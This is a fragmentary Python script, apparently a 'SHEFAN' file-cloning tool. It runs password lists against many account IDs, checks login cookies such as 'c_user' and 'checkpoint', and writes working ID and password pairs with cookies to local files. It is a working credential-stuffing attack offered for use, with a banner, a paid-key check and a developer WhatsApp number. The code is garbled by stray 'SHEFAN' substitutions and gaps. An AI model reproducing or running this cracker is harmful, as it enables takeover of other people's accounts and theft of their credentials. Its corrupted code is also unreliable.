...
from concuSHEFANent.futures import ThreadPoolExecutor as tred
...
bln = dic[str(datetime.datetime.now().month)]9
...
def banner():
	print('\x1b[1;92m\n	 \t\x1b[1;91m   _____ _    _ ______ ______      _   _ 
  / ____| |  | |  ____|  ____/\   | \ | |
 | (___ | |__| | |__  | |__ /  \  |  \| |
  \___ \|  __  |  __| |  __/ /\ \ | . ` |
  ____) | |  | | |____| | / ____ \| |\  |
 |_____/|_|  |_|______|_|/_/    \_\_| \_|
                                         ...
                                         ────────────────────────────────────────────────────┐\n │[✓] DEVOLPER   :	[SHEFAN]	  │\n │[✓] WHATSAPP   :			+8801962510071			│\n │[✓] GITHUB	 :			TERMUX-SHEFAN		   │\n │[✓] TOOLS	  :			SHEFANN-FILE-CLONING		  │\n │[✓] TEAM	   :			NAI					   │\n └──────────────────────────────────────────────────────┘\n	\n	\t \x1b[47m\x1b[1;31mTHE TOOL WILL BE NOT UPDATED EVERY SEVEN DAYS\x1b[40m\x1b[00m\n		   ')
...
def login1():
	try:
		...
		try:
			...
			login_lagi334()
		except requests.exceptions.ConnectionESHEFANor:
...
def login_lagi334():
	try:
		...
		print('  %s[%sx%s]%s LOGIN ESHEFANOR....TRY AGAIN !!%s' % (x, k, x, m, x))
		exit()

def notice():
	print('\n\x1b[0;91mYOU ARE NOT PREMIUM USER ')
	print('\n\x1b[0;91mPLEASE BUY SHEFAN_GREEN TOOL ')
	print('\x1b[0;93mSENT THIS KEY TO ADMIN >> %s%s' % (G, basesplit))
	print('\x1b[0;92mADMIN WHATSAPP\x1aSHEFAN_RIYAD')
	time.sleep(2)
...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://raw.githubusercontent.com/Riyad-SHEFAN-Hacker/text/main/Dis').text
			if basesplit in plr:
				key = basesplit
				stat = '\x1b[0;92mPAID'
				FY = '\x1b[0;93m'
		...
		if _____cowok__pink_____ in ('1',):
			if basesplit in plr:
				...
				os.system('am start https://wa.me/+8801962510071')
			elif basesplit in ('3',):
				print('=>EXIT DONE ')
				exit()
			else:
...
def passwrd():
	...
	print('👉\x1b[1;92mYOUR OK ID SAVED: SHEFAN_ok.txt')
	print('👉\x1b[1;91mYOUR CP ID SAVED: SHEFAN_cp.txt')
...
def crack(idf, pwv):
	...
	(sys.stdout.write(f"\r{b}SHEFAN_CRACK{P} [{k}{loop}{P}/{h}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{k}{cp}{x}]—[{bo}{'{:.0%}'.format(loop / float(len(id)))}{P}]  "),)
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if 'checkpoint' in po.cookies.get_dict().keys():
				...
				print('')
				print('\x1b[1;92m══════════════════════════════════════════')
				print('\x1b[1;91m[✓] STATUS		: \x1b[1;96mSHEFAN_CP🥀')
				...
				open('SHEFAN_CP.txt', 'a').write(idf + '|' + pw + '\n')
				akun.append(idf + '|' + pw)
				cp += 1
				...
				print('')
				print('\x1b[1;91m══════════════════════════════════════════')
				print('\x1b[1;92m[✓] STATUS		: \x1b[1;96mSHEFAN_OK💚')
				...
				print('\x1b[1;91m══════════════════════════════════════════')
				print('')
				open('SHEFAN_Ok.txt', 'a').write(idf + '|' + pw + '|' + ua + '\n')
	...
	for pw in pwv:
		try:
			...
			if 'checkpoint' in po.cookies.get_dict().keys():
				...
				print('\x1b[1;91m══════════════════════════════════════════')
				print('')
				open('SHEFAN_OK.txt', 'a').write(idf + '|' + pw + kuki + '\n')
		...
		try:
			...
			if 'checkpoint' in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					cetak(nel(statuscp1, 'SHEFAN CP', **('title',)))
					open('SHEFAN_CP.txt', 'a').write(idf + '|' + pw + '\n')
					akun.append(idf + '|' + pw)
					cp += 1
			elif 'c_user' in ses.cookies.get_dict().keys():
				...
				if 'no' in taplikasi:
					...
					statusok1 = nel(statusok, 'green', **('style',))
					cetak(nel(statusok1, '[bold green]SHEFAN_OK[/bold green]', **('title',)))
					ok += 1
				else:
					continue
			else:
		...
		try:
			...
			if 'checkpoint' in po.cookies.get_dict().keys() or 'ya' in oprek:
				...
				if 'ya' in princp:
					...
					statuscp = f'''[•] ID	   : {idf} [•] PASSWORD : {pw}'''
					statuscp1 = nel(statuscp, 'red', **('style',))
					cetak(nel(statuscp1, 'SHEFAN_CP', **('title',)))
					open('SHEFAN_CP.txt', 'a').write(idf + '|' + pw + '\n')
					akun.append(idf + '|' + pw)
					cp += 1
			elif 'c_user' in ses.cookies.get_dict().keys():
	...
	for kes in akun:
		try:
			try:
				id = kes.split('|')[0]
				pw = kes.split('|')[1]
			except IndexESHEFANor:
				time.sleep(2)
				print('\r%s++++ %s ----> ESHEFANor	  %s' % (b, kes, x))
